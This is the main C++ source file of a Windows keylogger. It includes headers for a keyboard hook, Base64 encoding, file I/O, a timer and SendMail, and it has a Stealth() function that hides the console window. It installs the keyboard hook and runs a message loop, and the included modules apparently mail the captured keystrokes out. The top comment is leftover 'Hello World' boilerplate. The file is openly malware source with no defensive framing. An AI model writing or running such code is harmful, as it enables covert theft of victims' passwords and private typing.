//============================================================================
// Name        : keylogger1.cpp
// Author      : 
// Version     :
// Copyright   : Your copyright notice
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

void Stealth()
	{
	 HWND Stealth;
	 AllocConsole();
	 Stealth = FindWindowA("ConsoleWindowClass", NULL);
	 ShowWindow(Stealth,0);
	}

int main() {
	MSG Msg;

	IO::MkDir(IO::GetOurPath(true));
	InstallHook();
	//Stealth();
	while(GetMessageA(&Msg, NULL, 0, 0)){
		        TranslateMessage(&Msg);
		        DispatchMessageA(&Msg);
	}
	//while(true);
	MailTimer.Stop();
	return 0;
}
